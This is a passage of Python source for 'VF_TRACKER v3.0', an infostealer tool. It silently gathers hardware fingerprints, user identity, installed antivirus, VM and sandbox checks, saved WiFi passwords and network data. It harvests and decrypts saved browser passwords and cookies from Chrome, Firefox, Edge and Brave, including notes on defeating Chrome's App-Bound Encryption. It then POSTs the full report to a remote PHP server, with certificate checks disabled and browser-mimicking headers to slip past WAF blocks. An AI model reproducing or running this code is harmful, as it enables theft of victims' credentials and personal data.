    # ─── Strategy 4: Concatenated numbers ───
    m = re.search(r'(-?\d{2})\.(\d{4,6})(-?\d{2,3})\.(\d{4,6})', full_text)
    if m:
        lat_val = f"{m.group(1)}.{m.group(2)}"
        lon_val = f"{m.group(3)}.{m.group(4)}"
        try:
            if -90 <= float(lat_val) <= 90 and -180 <= float(lon_val) <= 180:
                return f"{lat_val}, {lon_val}"
        except ValueError:
            pass

    return "\u0646\u0627\u0645\u0634\u062e\u0635"  # نامشخص


# ═══════════════════════════════════════════════════════════════════════════════
# REPORT BUILDER v3 — Comprehensive Report
# ═══════════════════════════════════════════════════════════════════════════════

def build_report(output_path=None, silent=False):
    """
    Build the full system tracker report with all phases.
    Returns: (output_path, report_text, report_data_dict)
    """
    def log(msg):
        if not silent:
            print(msg)

    if output_path is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(script_dir, "VF_TRACKER_REPORT.txt")

    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_status = "YES (Admin)" if is_admin() else "NO (Limited)"

    log(f"\n{'='*70}")
    log(f"  VF_TRACKER v3.0 - Collecting system information...")
    log(f"  Time: {timestamp}")
    log(f"{'='*70}\n")

    # ─── Phase 1: Hardware Fingerprint ───
    log("  [1/8] Collecting hardware fingerprint...")
    motherboard = get_motherboard_serial()
    bios_uuid = get_bios_uuid()
    cpu_id = get_cpu_processor_id()
    disk_serial = get_disk_serial()
    gpu_list = get_gpu_info()
    battery = get_battery_info()
    mac_addr = get_mac_address()
    hwid = generate_hwid(motherboard, bios_uuid, cpu_id, disk_serial, mac_addr)
    machine_id = generate_machine_id(hwid)

    # ─── Phase 1.5: OS & Basic ───
    os_info, cpu_info = get_os_info()
    hw_info = get_hardware_resources()
    uptime = get_system_uptime()
    hostname = socket.gethostname()

    # ─── Phase 2: User Identity ───
    log("  [2/8] Collecting user identity...")
    username = get_windows_username()
    fullname = get_user_fullname()
    last_login = get_last_login()
    users_list = get_installed_users()
    domain_wg = get_domain_workgroup()
    tz_locale = get_timezone_locale()
    kb_layout = get_keyboard_layout()

    # ─── Phase 2.5: Environment ───
    log("  [3/8] Detecting environment...")
    programs = get_installed_programs()
    processes = get_running_processes()
    antivirus = get_antivirus_info()
    vm_detection = detect_vm_sandbox()
    vpn_proxy = detect_vpn_proxy()

    # ─── Phase 3: Deep Network ───
    log("  [4/8] Collecting network information...")
    local_ip = get_local_ip()
    gateway = get_default_gateway()
    wifi_ssid, wifi_signal = get_current_wifi_info()
    wifi_profiles = get_all_wifi_profiles()
    dns_servers = get_dns_servers()
    dhcp_server = get_dhcp_server()
    adapters = get_all_network_adapters()
    proxy_settings = get_proxy_settings()
    firewall = get_firewall_status()
    wifi_passwords = get_wifi_passwords()
    connections = get_active_connections()
    arp_devices = get_arp_table()

    # ─── Phase 3.5: Public IP ───
    log("  [5/8] Retrieving public IP & geolocation...")
    pub_ip, isp, country, city, coords = get_info_from_numberia()

    # Parse coordinates for maps link
    maps_link = "N/A"
    if coords and coords not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and ',' in coords:
        try:
            parts = coords.split(',')
            maps_link = generate_maps_link(parts[0].strip(), parts[1].strip())
        except Exception:
            pass

    # ─── Phase 5: Credential Harvester ───
    log("  [6/8] Harvesting browser credentials...")
    credentials = harvest_all_credentials()

    # ─── Phase 4: Machine ID ───
    log("  [7/8] Registering machine ID...")
    log("  [8/8] Saving machine marker...")
    existing_marker, marker_status = check_existing_marker()
    is_new_machine = existing_marker is None
    marker_saved, marker_msg = save_registry_marker(machine_id)

    # ═══ BUILD TXT REPORT ═══
    lines = []
    sep = "=" * 70
    sep2 = "-" * 70

    lines.append(sep)
    lines.append(f"  VF_TRACKER v3.0 REPORT")
    lines.append(f"  Generated    : {timestamp}")
    lines.append(f"  Admin Access  : {admin_status}")
    lines.append(f"  Machine ID    : {machine_id}")
    lines.append(f"  HWID          : {hwid[:32]}...")
    lines.append(f"  Status        : {'NEW MACHINE' if is_new_machine else f'Known (first ID: {existing_marker})'}")
    lines.append(sep)

    # ── Section 1: Hardware Fingerprint ──
    lines.append("")
    lines.append(f"  {'[HARDWARE FINGERPRINT]':^70}")
    lines.append(sep2)
    lines.append(f"  [HW] Motherboard Serial  : {motherboard}")
    lines.append(f"  [HW] BIOS UUID           : {bios_uuid}")
    lines.append(f"  [HW] CPU Processor ID    : {cpu_id}")
    lines.append(f"  [HW] Disk Drive Serial   : {disk_serial}")
    lines.append(f"  [HW] MAC Address         : {mac_addr}")
    lines.append(f"  [HW] Battery             : {battery}")
    if isinstance(gpu_list, list):
        for i, gpu in enumerate(gpu_list):
            lines.append(f"  [HW] GPU #{i+1}              : {gpu}")
    else:
        lines.append(f"  [HW] GPU                 : {gpu_list}")
    lines.append(f"  [HW] HWID (SHA256)       : {hwid}")
    lines.append(f"  [HW] Machine ID          : {machine_id}")
    lines.append(f"  [HW] Registry Marker     : {marker_msg}")

    # ── Section 2: System & OS ──
    lines.append("")
    lines.append(f"  {'[SYSTEM & OS]':^70}")
    lines.append(sep2)
    lines.append(f"  [SYS] Hostname           : {hostname}")
    lines.append(f"  [SYS] Operating System   : {os_info}")
    lines.append(f"  [SYS] Processor          : {cpu_info}")
    lines.append(f"  [SYS] Last Restart       : {uptime}")
    if 'RAM' in hw_info:
        lines.append(f"  [SYS] RAM                : {hw_info['RAM']}")
    if 'Disk C:' in hw_info:
        lines.append(f"  [SYS] Drive C:           : {hw_info['Disk C:']}")

    # ── Section 3: User Identity ──
    lines.append("")
    lines.append(f"  {'[USER IDENTITY]':^70}")
    lines.append(sep2)
    lines.append(f"  [USER] Username          : {username}")
    lines.append(f"  [USER] Full Name         : {fullname}")
    lines.append(f"  [USER] Last Login        : {last_login}")
    lines.append(f"  [USER] Domain/Workgroup  : {domain_wg}")
    lines.append(f"  [USER] Timezone/Locale   : {tz_locale}")
    lines.append(f"  [USER] Keyboard Layout   : {kb_layout}")
    lines.append(f"  [USER] All Users:")
    for u in users_list[:10]:
        if u: lines.append(f"         - {u}")

    # ── Section 4: Environment ──
    lines.append("")
    lines.append(f"  {'[ENVIRONMENT DETECTION]':^70}")
    lines.append(sep2)
    lines.append(f"  [ENV] Antivirus:")
    for av in antivirus:
        if av: lines.append(f"         - {av}")
    lines.append(f"  [ENV] VM/Sandbox Detection:")
    for vm in vm_detection:
        if vm: lines.append(f"         - {vm}")
    lines.append(f"  [ENV] VPN/Proxy Detection:")
    for vp in vpn_proxy:
        if vp: lines.append(f"         - {vp}")
    lines.append(f"  [ENV] Installed Programs ({len(programs)} shown):")
    for prog in programs[:20]:
        if prog: lines.append(f"         - {prog}")
    lines.append(f"  [ENV] Running Processes ({len(processes)} shown):")
    for proc in processes[:15]:
        if proc: lines.append(f"         - {proc}")

    # ── Section 5: Network ──
    lines.append("")
    lines.append(f"  {'[NETWORK - INTERNAL]':^70}")
    lines.append(sep2)
    lines.append(f"  [NET] Local IP           : {local_ip}")
    lines.append(f"  [NET] Gateway            : {gateway}")
    lines.append(f"  [NET] DNS Servers        : {', '.join(dns_servers[:3])}")
    lines.append(f"  [NET] DHCP Server        : {dhcp_server}")
    lines.append(f"  [NET] Network Adapters:")
    for ad in adapters[:5]:
        if ad: lines.append(f"         - {ad}")
    lines.append(f"  [NET] Proxy Settings:")
    for ps in proxy_settings:
        if ps: lines.append(f"         - {ps}")

    # ── Section 6: WiFi ──
    lines.append("")
    lines.append(f"  {'[WIFI INFORMATION]':^70}")
    lines.append(sep2)
    lines.append(f"  [WIFI] Current SSID      : {wifi_ssid}")
    lines.append(f"  [WIFI] Signal Strength   : {wifi_signal}")
    lines.append(f"  [WIFI] Previous Networks ({len(wifi_profiles)} total):")
    for wp in wifi_profiles:
        if wp: lines.append(f"         - {wp}")
    lines.append(f"  [WIFI] Saved Passwords:")
    for name, passw in wifi_passwords:
        lines.append(f"         -> {name:<25} | Pass: {passw}")

    # ── Section 7: Public IP & Location ──
    lines.append("")
    lines.append(f"  {'[PUBLIC IP & GEOLOCATION]':^70}")
    lines.append(sep2)
    if pub_ip and pub_ip not in ("Not found", "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"):
        lines.append(f"  [NET] Public IP          : {pub_ip}")
        lines.append(f"  [NET] ISP                : {isp}")
        lines.append(f"  [LOC] Country            : {country}")
        lines.append(f"  [LOC] City               : {city}")
        lines.append(f"  [LOC] Coordinates        : {coords}")
        if maps_link != "N/A":
            lines.append(f"  [LOC] Google Maps        : {maps_link}")
    else:
        lines.append(f"  [ERROR] Internet info retrieval failed.")

    # ── Section 8: Browser Credentials ──
    lines.append("")
    _bc_title = "[BROWSER CREDENTIALS]"
    lines.append(f"  {_bc_title:^70}")
    lines.append(sep2)

    cred_summary = credentials.get("summary", {})
    chr_pw = credentials.get("chrome_passwords", [])
    ff_pw = credentials.get("firefox_passwords", [])
    edge_pw = credentials.get("edge_passwords", [])
    brave_pw = credentials.get("brave_passwords", [])
    chr_cookies_count = credentials.get("chrome_cookies_count", 0)

    lines.append(f"  [CRED] Chrome Passwords   : {cred_summary.get('chrome_passwords', 0)} found")
    lines.append(f"  [CRED] Chrome Cookies      : {chr_cookies_count} found")
    lines.append(f"  [CRED] Firefox Passwords   : {cred_summary.get('firefox_passwords', 0)} found ({cred_summary.get('firefox_decrypted', 0)} decrypted)")
    lines.append(f"  [CRED] Edge Passwords      : {cred_summary.get('edge_passwords', 0)} found")
    lines.append(f"  [CRED] Brave Passwords     : {cred_summary.get('brave_passwords', 0)} found")

    if chr_pw:
        lines.append(f"  [CRED] Chrome Saved Passwords:")
        for cred in chr_pw[:30]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")
        # Show decryption diagnostics for Chrome
        chr_diag = credentials.get("decryption_diagnostics", {}).get("chrome", {})
        if chr_diag:
            v20_count = sum(1 for p in chr_pw if 'v20' in p.get('password', '') or 'APP_BOUND' in p.get('password', ''))
            if v20_count > 0:
                lines.append(f"  [DIAG] Chrome v20 Decryption Diagnostics:")
                lines.append(f"         Version: {chr_diag.get('browser_version', 'unknown')}")
                lines.append(f"         Local State found: {chr_diag.get('local_state_found', False)}")
                lines.append(f"         App-Bound Encryption: {chr_diag.get('has_app_bound_encryption', False)}")
                lines.append(f"         Key extracted: {chr_diag.get('key_extracted', False)}")
                lines.append(f"         DPAPI method: {chr_diag.get('dpapi_method', 'none')}")
                if chr_diag.get('error'):
                    lines.append(f"         Error: {chr_diag['error'][:100]}")
                if chr_diag.get('app_bound_method'):
                    lines.append(f"         App-Bound decrypt: {chr_diag['app_bound_method']}")
                # IElevator COM details
                ie_diag = credentials.get("decryption_diagnostics", {}).get("_ielevator", {})
                if ie_diag:
                    if ie_diag.get('output'):
                        lines.append(f"         IElevator COM result: {ie_diag['output'][:80]}")
                    if ie_diag.get('exception'):
                        lines.append(f"         IElevator exception: {ie_diag['exception'][:80]}")
                # Memory scan details
                mem_diag = credentials.get("decryption_diagnostics", {}).get("_memory_scan", {})
                if mem_diag:
                    lines.append(f"         Memory scan: {mem_diag.get('error', mem_diag.get('output', 'N/A'))[:80]}")
                lines.append(f"         ---")
                lines.append(f"         SOLUTION: Chrome 127+ uses App-Bound Encryption (IElevator).")
                lines.append(f"         1. Make sure you run STORM_VX as Administrator")
                lines.append(f"         2. Chrome must be running (for IElevator COM or memory scan)")
                lines.append(f"         3. If still failing, Chrome version may need updated COM interface")

    if ff_pw:
        lines.append(f"  [CRED] Firefox Saved Passwords:")
        for cred in ff_pw[:20]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")

    if edge_pw:
        lines.append(f"  [CRED] Edge Saved Passwords:")
        for cred in edge_pw[:20]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")

    if brave_pw:
        lines.append(f"  [CRED] Brave Saved Passwords:")
        for cred in brave_pw[:20]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")

    # ── Section 9: Security ──
    lines.append("")
    lines.append(f"  {'[SECURITY]':^70}")
    lines.append(sep2)
    lines.append(f"  [SEC] Firewall Status:")
    for f in firewall:
        if f: lines.append(f"         - {f}")
    lines.append(f"  [SEC] Active Connections:")
    for conn in connections:
        if conn: lines.append(f"         -> {conn}")
    lines.append(f"  [SEC] LAN Devices (ARP):")
    for device in arp_devices:
        if device: lines.append(f"         -> {device}")

    lines.append("")
    lines.append(sep)

    report_text = "\n".join(lines)

    # ═══ Write TXT file ═══
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(report_text)
        log(f"\n  [OK] Report saved to: {output_path}")
    except Exception as e:
        log(f"\n  [ERROR] Failed to save: {e}")
        try:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            fallback = os.path.join(desktop, "VF_TRACKER_REPORT.txt")
            with open(fallback, 'w', encoding='utf-8') as f:
                f.write(report_text)
            log(f"  [OK] Fallback saved to: {fallback}")
            output_path = fallback
        except Exception:
            log(f"  [ERROR] Fallback also failed")

    # ═══ Build JSON data ═══
    report_data = {
        "version": "3.0",
        "timestamp": timestamp,
        "admin": admin_status,
        "is_new_machine": is_new_machine,
        "previous_machine_id": existing_marker,
        # Hardware
        "hwid": hwid,
        "machine_id": machine_id,
        "motherboard_serial": motherboard,
        "bios_uuid": bios_uuid,
        "cpu_processor_id": cpu_id,
        "disk_serial": disk_serial,
        "gpu": gpu_list,
        "battery": battery,
        "mac_address": mac_addr,
        # System
        "hostname": hostname,
        "os": os_info,
        "cpu": cpu_info,
        "uptime": uptime,
        "hardware": hw_info,
        # User
        "username": username,
        "fullname": fullname,
        "last_login": last_login,
        "users": users_list,
        "domain_workgroup": domain_wg,
        "timezone_locale": tz_locale,
        "keyboard_layout": kb_layout,
        # Environment
        "antivirus": antivirus,
        "vm_detection": vm_detection,
        "vpn_proxy": vpn_proxy,
        "installed_programs": programs[:30],
        "running_processes": processes,
        # Network
        "local_ip": local_ip,
        "gateway": gateway,
        "dns_servers": dns_servers,
        "dhcp_server": dhcp_server,
        "network_adapters": adapters,
        "proxy_settings": proxy_settings,
        "wifi_ssid": wifi_ssid,
        "wifi_signal": wifi_signal,
        "wifi_profiles": wifi_profiles,
        "wifi_passwords": [{"name": n, "password": p} for n, p in wifi_passwords],
        # Public
        "public_ip": pub_ip,
        "isp": isp,
        "country": country,
        "city": city,
        "coordinates": coords,
        "maps_link": maps_link,
        # Credentials
        "credentials": credentials,
        # Security
        "firewall": firewall,
        "active_connections": connections,
        "arp_devices": arp_devices,
    }

    # ═══ Save JSON ═══
    json_path = output_path.replace('.txt', '.json')
    try:
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        log(f"  [OK] JSON saved to: {json_path}")
    except Exception as e:
        log(f"  [ERROR] JSON save failed: {e}")

    if not silent:
        print(report_text)

    return output_path, report_text, report_data


# ═══════════════════════════════════════════════════════════════════════════════
# SERVER SENDER — POST data to PHP endpoint
# ═══════════════════════════════════════════════════════════════════════════════

def send_to_server(server_url, token, report_text, report_data, silent=False):
    """Send tracker report to remote PHP server via HTTP POST with retry."""
    def log(msg):
        if not silent:
            print(msg)

    max_retries = 2
    for attempt in range(1, max_retries + 1):
        try:
            post_data = urllib.parse.urlencode({
                'vf_token': token,
                'tracker_data': report_text,
                'tracker_json': json.dumps(report_data, ensure_ascii=False)
            }).encode('utf-8')

            req = urllib.request.Request(server_url, data=post_data, method='POST')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
            req.add_header('Referer', server_url)
            req.add_header('Origin', server_url.rsplit('/', 1)[0] if '/' in server_url else server_url)
            req.add_header('Connection', 'keep-alive')

            ctx = ssl._create_unverified_context()
            response = urllib.request.urlopen(req, timeout=2, context=ctx)
            response_data = response.read().decode('utf-8')

            try:
                result = json.loads(response_data)
                if result.get('status') == 'ok':
                    log(f"  [OK] Report sent to server: {server_url}")
                    log(f"       Saved as: {result.get('file', 'unknown')}")
                    return True
                else:
                    log(f"  [ERROR] Server rejected: {result.get('message', 'Unknown error')}")
                    if attempt < max_retries:
                        import time as _t
                        log(f"  [RETRY] Attempt {attempt+1}/{max_retries} in 2s...")
                        _t.sleep(2)
                        continue
                    return False
            except json.JSONDecodeError:
                log(f"  [OK] Server received data")
                return True

        except urllib.error.HTTPError as e:
            if e.code == 403 and attempt < max_retries:
                import time as _t
                log(f"  [WARN] HTTP 403 - WAF/CDN block? Retry {attempt+1}/{max_retries} in 2s...")
                _t.sleep(2)
                continue
            log(f"  [ERROR] Server HTTP {e.code}: {e.reason}")
            if attempt < max_retries:
                import time as _t
                _t.sleep(2)
                continue
            return False
        except urllib.error.URLError as e:
            log(f"  [ERROR] Cannot reach server: {e.reason}")
            if attempt < max_retries:
                import time as _t
                log(f"  [RETRY] Attempt {attempt+1}/{max_retries} in 2s...")
                _t.sleep(2)
                continue
            return False
        except Exception as e:
            log(f"  [ERROR] Send failed: {e}")
            if attempt < max_retries:
                import time as _t
                _t.sleep(2)
                continue
            return False

    log(f"  [FAILED] All {max_retries} attempts failed.")
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VF_TRACKER v3.0 - Advanced System Identity Tracker")
    parser.add_argument("--output", "-o", type=str, default=None,
                        help="Custom output path for TXT report")
    parser.add_argument("--silent", "-s", action="store_true",
                        help="Silent mode - only write to file")
    parser.add_argument("--server", type=str, default=DEFAULT_SERVER_URL,
                        help=f"PHP receiver URL (default: {DEFAULT_SERVER_URL})")
    parser.add_argument("--no-server", action="store_true",
                        help="Skip sending to server (local only)")
    parser.add_argument("--no-creds", action="store_true",
                        help="Skip credential harvesting (browsers)")
    parser.add_argument("--token", type=str, default=VF_SECRET_TOKEN,
                        help="Security token for server authentication")
    args = parser.parse_args()

    # Always build report silently (no verbose console output)
    result_path, report_text, report_data = build_report(
        output_path=args.output, silent=True
    )

    # Only show the server send result to user
    if not args.no_server and args.server:
        if not args.silent:
            print(f"  [TRACKER] Sending report to server...")
        send_to_server(
            server_url=args.server,
            token=args.token,
            report_text=report_text,
            report_data=report_data,
            silent=False  # Always show server result
        )
    else:
        if not args.silent:
            print(f"  [TRACKER] Report saved: {result_path}")
            print(f"  [TRACKER] Skipped server send (--no-server)")
